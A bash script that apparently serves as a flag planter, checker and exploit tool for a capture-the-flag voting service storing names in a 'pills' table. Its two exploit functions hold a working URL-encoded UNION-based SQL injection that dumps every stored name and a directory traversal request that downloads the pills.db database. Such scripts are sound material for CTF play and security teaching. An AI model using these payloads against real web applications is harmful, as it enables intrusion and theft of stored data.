#!/bin/bash

function Help(){
    echo "Usage: $0 --plant <host> <port> <flag>"
    echo "       $0 --check <host> <port> <flag>"
    echo "       $0 --exploit-sql-injection <host> <port>"
    echo "       $0 --exploit-directory-traversal <host> <port>"
}

# $1 : Host
# $2 : Port
function IndexExists(){
    curl --silent --fail http://${1}:${2}/index.html >/dev/null
}

# $1 : Host
# $2 : Port
# $3 : Flag
function PlantFlag(){
    vote=$((RANDOM%2))
    if IndexExists ${1} ${2}; then
        test "$(curl --silent --fail http://${1}:${2}/take -d "name=${3}" -d "pill=${vote}")" = 'Thanks'
    else
        false
    fi
}

# $1 : Host
# $2 : Port
# $3 : Flag
function CheckFlag(){
    if IndexExists ${1} ${2}; then
        test "$(curl --silent --fail http://${1}:${2}/me/${3})" != 'No vote'
    else
        false
    fi
}

# $1 : Host
# $2 : Port
function ExploitSqlInjection(){
    count=$(curl --silent --fail "http://${1}:${2}/me/BlimBlamBlar%22%20and%201%3d2%20union%20select%20count%28%2a%29%20from%20pills%2d%2d")
    if [[ "${count}" -eq "${count}" ]] 2>/dev/null; then
        for i in $(seq 0 $((count-1))); do
            echo $(curl --silent --fail "http://${1}:${2}/me/BlimBlamBlar%22%20union%20select%20name%20from%20pills%20limit%201%20offset%20${i}%2d%2d")
        done
    else
        echo "Not exploitable to SQL injection." >&2
        false
    fi
}

function ExploitDirectoryTraversal(){
    output=$(mktemp)
    if curl --silent --fail "http://${1}:${2}/../pills.db" > ${output}; then
        sqlite3 ${output} 'select name from pills'
        rm -f ${output}
    else
        rm -f ${output}
        echo "Not exploitable to directory traversal." >&2
        false
    fi
}

case $1 in
    "--plant")
        PlantFlag $2 $3 $4
        ;;
    "--check")
        CheckFlag $2 $3 $4
        ;;
    "--exploit-sql-injection")
        ExploitSqlInjection $2 $3
        ;;
    "--exploit-directory-traversal")
        ExploitDirectoryTraversal $2 $3
        ;;
     *)
        Help
        ;;
esac
